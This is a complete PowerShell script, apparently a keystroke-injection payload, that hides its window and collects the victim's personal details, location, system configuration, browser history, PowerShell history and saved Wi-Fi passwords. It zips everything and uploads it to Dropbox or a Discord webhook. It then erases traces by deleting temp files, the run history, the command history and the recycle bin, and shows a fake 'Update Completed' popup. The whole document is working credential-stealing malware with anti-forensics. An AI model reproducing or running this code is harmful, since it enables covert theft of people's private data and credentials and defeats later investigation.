$i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
add-type -name win -member $i -namespace native;
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
$FolderName = "$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm)"
$FileName = "$FolderName.txt"
$ZIP = "$FolderName.zip"
New-Item -Path $env:tmp/$FolderName -ItemType Directory
tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
function Get-fullName {

    try {
    $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}
$fullName = Get-fullName
function Get-email {  
    try {
    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}
$email = Get-email
function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device 
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher 
	$GeoWatcher.Start() 
	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 
	}  
	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GeoWatcher.Position.Location | Select Latitude,Longitude 
	}
	}
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 
}
$GeoLocation = Get-GeoLocation
$GeoLocation = $GeoLocation -split " "
$Lat = $GeoLocation[0].Substring(11) -replace ".$"
$Lon = $GeoLocation[1].Substring(10) -replace ".$"
$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }
$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 
$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name
If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
Else{ $UAC = "Unknown" } 
$lsass = Get-Process -Name "lsass"
if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 
else {$lsass = "LSASS is not running as a protected process."}
$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name
try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}
try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}
try{$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select InterfaceAlias, IPAddress, PrefixOrigin | Out-String}
catch{$localIP = "Error getting local IP"}
$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select Name, MacAddress, Status | Out-String
if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerName = $computerSystem.Name
$computerModel = $computerSystem.Model
$computerManufacturer = $computerSystem.Manufacturer
$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String
$computerOs=(Get-WMIObject win32_operatingsystem) | Select Caption, Version  | Out-String
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String
$ScheduledTasks = Get-ScheduledTask
$klist = klist sessions
$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250
$NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250
$listener = Get-NetTCPConnection | select @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250
$output = @"

Full Name: $fullName

Email: $email

GeoLocation:
Latitude:  $Lat 
Longitude: $Lon

------------------------------------------------------------------------------------------------------------------------------

Local Users:
$luser

------------------------------------------------------------------------------------------------------------------------------

UAC State:
$UAC

LSASS State:
$lsass

RDP State:
$RDP

------------------------------------------------------------------------------------------------------------------------------

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$computerName

Model:
$computerModel

Manufacturer:
$computerManufacturer

BIOS:
$computerBIOS

OS:
$computerOs

CPU:
$computerCpu

Mainboard:
$computerMainboard

Ram Capacity:
$computerRamCapacity

Total installed Ram:
$computerRam

Video Card: 
$videocard

------------------------------------------------------------------------------------------------------------------------------

Contents of Start Up Folder:
$StartUp

------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
$ScheduledTasks

------------------------------------------------------------------------------------------------------------------------------

Logon Sessions:
$klist

------------------------------------------------------------------------------------------------------------------------------

Recent Files:
$RecentFiles

------------------------------------------------------------------------------------------------------------------------------

Hard-Drives:
$Hdds

COM Devices:
$COMDevices

------------------------------------------------------------------------------------------------------------------------------

Network Adapters:
$NetworkAdapters

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles: 
$wifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Process:
$process

------------------------------------------------------------------------------------------------------------------------------

Listeners:
$listener

------------------------------------------------------------------------------------------------------------------------------

Services:
$service

------------------------------------------------------------------------------------------------------------------------------

Installed Software: 
$software

------------------------------------------------------------------------------------------------------------------------------

Drivers: 
$drivers

------------------------------------------------------------------------------------------------------------------------------

"@
$output > $env:TEMP\$FolderName/computerData.txt
function Get-BrowserData {
    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 
    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}
Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
Compress-Archive -Path $env:tmp/$FolderName -DestinationPath $env:tmp/$ZIP
function dropbox {
$TargetFilePath="/$ZIP"
$SourceFilePath="$env:TEMP\$ZIP"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $db
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}
if (-not ([string]::IsNullOrEmpty($db))){dropbox}
function Upload-Discord {
[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)
$hookurl = "$dc"
$Body = @{
  'username' = $env:username
  'content' = $text
}
if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:tmp/$ZIP"}
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
Remove-Item (Get-PSreadlineOption).HistorySavePath
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)